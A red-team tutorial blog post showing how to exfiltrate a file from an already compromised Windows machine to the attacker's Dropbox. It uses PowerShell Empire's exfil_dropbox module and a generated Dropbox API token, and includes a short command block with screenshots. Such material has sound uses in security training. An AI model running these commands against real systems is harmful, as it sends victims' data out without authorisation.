<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/exfiltration/" rel="category tag">Exfiltration</a>, <a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/" rel="category tag">PowerShell Empire</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Data Exfiltration using PowerShell Empire</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/data-exfiltration-using-powershell-empire/" rel="bookmark"><time class="entry-date published" datetime="2019-05-27T18:55:55+00:00">May 27, 2019</time><time class="updated" datetime="2025-05-15T13:17:08+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In our previous post, we had already discussed “<span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/command-and-control-with-dropboxc2/">Command and Control with DropboxC2</a></span>”  But we are going to demonstrate Data Exfiltration by using PowerShell Empire where we will extract the unauthorized data inside our Dropbox account. Here you will learn how an intruder can exfiltrate data over cloud storage.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">What is Data Exfiltration</span> </span></h3>
<p><span style="color: #000000;">Data exfiltration occurs when malware and/or a malicious actor carries out an unauthorized data transfer from a computer. It is also commonly called data extrusion or data exportation. Data exfiltration is also considered a form of data theft. During the past couple of decades, a number of data exfiltration efforts severely damaged the consumer confidence, corporate valuation, and intellectual property of businesses and national security of governments across the world.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2ZoPZ60wVro/XOww2gMl_ZI/AAAAAAAAejg/-mR6ZgB7SM04pS0c1Hn5mJD7W1wUxlfTQCLcBGAs/s1600/0.png"/></span></p>
<h3><span style="color: #800000;">Methods of Data Exfiltration</span></h3>
<p><span style="color: #000000;"><strong>Open Methods:</strong></span></p>
<ul>
<li><span style="color: #000000;">HTTP/HTTPS Downloads &amp; Uploads</span></li>
<li><span style="color: #000000;">FTP</span></li>
<li><span style="color: #000000;">Email</span></li>
<li><span style="color: #000000;">Instant Messaging</span></li>
<li><span style="color: #000000;">P2P filesharing</span></li>
</ul>
<p><span style="color: #000000;"><strong>Concealed Methods:</strong></span></p>
<ul>
<li><span style="color: #000000;">SSH</span></li>
<li><span style="color: #000000;">VPN</span></li>
<li><span style="color: #000000;">Protocol Tunneling</span></li>
<li><span style="color: #000000;">Cloud Storage Uploads</span></li>
<li><span style="color: #000000;">Steganography</span></li>
<li><span style="color: #000000;">Timing channel</span></li>
</ul>
<p><span style="color: #0000ff;">(<a style="color: #0000ff;" href="https://en.wikipedia.org/wiki/Data_exfiltration">From Wikipedia</a>)</span></p>
<h3><span style="color: #800000;">Generate Token Via Dropbox API</span></h3>
<p><span style="color: #000000;">To do that, this tool requires a Dropbox API. To get that, first, create an account on Dropbox. Then, after creating the account, head to developer tools here. A webpage will open similar to the one shown below. Here we will select the “Dropbox API”. Then, in the type of access section, we will choose “App folder”. Name the app as per your choice. Then click on the Create App Button to proceed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DNo7UnhqGys/XOww2ummryI/AAAAAAAAejc/oochiycFkZolF7i23MAoYIEpr8MZSS8tACLcBGAs/s1600/1.jpg"/></span></p>
<p><span style="color: #000000;">This will lead to another webpage as shown below. Here, move on to the O Auth 2 Section, and</span></p>
<p><span style="color: #000000;">Generate access token. This will give the Dropbox API required for this particular practical; now copy the generated token.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_PgHqZ3Aqgc/XOww25qYuKI/AAAAAAAAejk/-tO_JCeyJncYmhY181FaUd2c4oiCpiDTQCLcBGAs/s1600/2.jpg"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Data Exfiltration</span> </span></h3>
<p><span style="color: #000000;">Now we are going to use Powershell Empire for exfiltration, considering we have already compromised the victim machine, and we are about to complete our mission by copying data from inside the victim without his knowledge.</span></p>
<p><span style="color: #000000;">As you can observe, we have Empire-agent, which means I have already spawned a shell of the victim’s machine, and Empire has a post-exploit for data exfiltration where we will use the above token.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule exfiltration/exfil_dropbox
set SourceFilePath C:\Users\raj\Desktop\notes.txt
set TargetFilePath /Apps/notes.txt
set ApiKey &lt;API Token&gt;
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZW0i_cYSqHw/XOww4CEDW8I/AAAAAAAAejs/tia8eFmd9V0ebDm_GgeDK9g3ioFaegk7wCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As you can observe that I have notes.txt inside /my files, which means we have successfully transferred the data from a source location to the destination.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hPTRyhz_QeM/XOww4DlSIZI/AAAAAAAAejo/0NMoF8DFs7U1Nj0b1hW53NjiINtUNMqcQCLcBGAs/s1600/4.jpg"/></span></p>
<p><span style="color: #000000;">Thus, in this way, we have successfully transferred the data from the victim’s machine to our Dropbox, and hence this technique is known as Dropbox exfiltration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KvLf7UHiEts/XOww4f9Ab-I/AAAAAAAAejw/TgK7nK-W0T4sRBc3CIorchNZNInbCpexQCLcBGAs/s1600/5.jpg"/></span></p>
<p><span style="color: #000000;">To learn more about Exfiltration Techniques. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/exfiltration/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles, an Information Security Consultant, Social Media Lover, and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
